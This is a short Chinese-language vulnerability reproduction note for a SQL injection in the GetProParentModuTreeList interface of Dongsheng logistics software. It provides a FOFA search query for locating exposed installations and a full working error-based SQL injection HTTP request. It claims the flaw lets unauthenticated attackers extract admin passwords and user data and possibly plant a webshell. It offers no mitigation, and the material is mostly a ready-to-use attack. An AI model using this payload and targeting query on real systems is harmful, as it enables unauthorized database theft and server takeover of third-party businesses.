# 东胜物流软件SQL

### 1.搜索语法

东胜物流软件 GetProParentModuTreeList接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

### 2.fofa语法

```xml
body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"
```

### 3.漏洞复现

```xml
GET /MvcShipping/MsBaseInfo/GetProParentModuTreeList?PARENTID=%27+AND+4757+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%284757%3D4757%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29+AND+%27KJaG%27%3D%27KJaG HTTP/1.1
```

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719398887150-e09aafd7-f25a-4a3e-8f95-4cc3eae5fa4a.png)